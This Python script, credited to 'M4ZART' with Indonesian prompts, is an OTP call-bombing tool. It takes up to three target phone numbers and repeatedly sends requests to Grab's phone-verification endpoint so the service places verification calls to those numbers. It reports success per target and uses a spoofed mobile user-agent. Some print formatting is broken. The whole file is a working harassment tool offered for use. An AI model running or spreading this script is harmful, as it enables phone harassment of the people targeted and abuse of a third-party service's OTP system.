#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by M4ZART
"""
"""

try:
	import os, requests, time, json
except ModuleNotFoundError:
	print("$ pip install requests\n")
	exit()

os.system('clear')
c=('\033[1;36m')
r=('\033[1;31m')
g=('\033[1;32m')
w=('\033[1;37m')
print("""%"""%(c,r,g,r,g,r,g,r,g,r,w,r))
print("%s[*] Klik ENTER untuk melewati step%s"%(g,g))
no1 = input("[?] NUM TARGET1 => %s"%(w))
no2 = input("%s[?] NUM TARGET2 => %s"%(g,w))
no3 = input("%s[?] NUM TARGET3 => %s"%(g,w))
jlmh=int(input("%s[?] SEND MAX 12 => %s"%(g,w)))

try:
	henti_tanya=False
	forcecon=0
	print("\n%s[-] RESULT:%s"%(r,w));time.sleep(1)
	for i in range(jlmh):
		cout=1
		print(f"{'{'}{i+1}{'}'}"+"="*40+f"{'{'}{i+1}{'}'}")
		for i in no1,no2,no3:
			if i == '':
				cout+=1
				continue
			dt={'method':'CALL','countryCode':'id','phoneNumber':i,'templateID':'pax_android_production'}
			r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt,headers={'user-agent':'Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6264; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36'})

			if "10074" in r1.text:
				print(f"[!] Error 20003 Please Contact Developer!")
				if henti_tanya == True:
					pass
				else:
					pil=input("[?]] ")
					if pil.lower() == 'y':
						for x in range(60):
							try:
								print(end=f"\r[!]  {60-(x+1)} ",flush=True)
								time.sleep(1)
							except: break
						print("\n[OK] ")
					elif pil.lower() == 'f':
						henti_tanya=True
					else:
						forcecon+=1
						if forcecon >= 3:
							print(f"[!] {w}")
			elif "challengeID" in r1.text:
				print(f"[+] {c}TARGET{cout} {g}SUCCESS{w}")
			else:
				print(f"[-] {c}TARGET{cout} {r}ERROR{w}")
			time.sleep(10)
			cout+=1
	print("{end}"+"="*40+"{end}")
except KeyboardInterrupt:
	print("\n%"%(c))
